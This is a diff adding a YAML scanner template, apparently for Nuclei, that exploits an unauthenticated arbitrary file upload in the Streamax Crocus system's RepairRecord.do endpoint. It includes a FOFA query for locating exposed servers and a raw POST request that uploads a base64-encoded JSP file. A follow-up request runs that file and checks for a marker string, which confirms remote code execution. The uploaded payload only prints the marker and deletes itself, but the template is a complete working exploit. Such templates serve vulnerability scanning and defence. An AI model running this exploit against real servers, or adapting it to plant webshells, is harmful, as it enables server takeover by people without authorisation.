@@ -1,0 +1,44 @@
+id: ruiming-Crocus-RepairRecord_do-File-upload
+
+info:
+  name: 锐明技术Crocus系统 RepairRecord.do 任意文件上传漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+    锐明技术Crocus系统 RepairRecord.do 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://mp.weixin.qq.com/s/0NQ1AwXMAPVJ1lwDoUtOuA
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /RepairRecord.do?Action=imageupload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "username": "streamax20020818",
+          "license": "1",
+          "chnnel": 1,
+          "type": 1,
+          "imsage": "PCUgb3V0LnByaW50bG4oInBib3lqbm5yZmlwbXBsc3VrZGVjenVkc2VmeG15d2UiKTsgbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTsgJT4=",
+          "picturename": "{{username}}.jsp"
+        }
+  - raw:
+      - |
+        GET /SystemFile/PictureRecord/imageupload/{{username}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
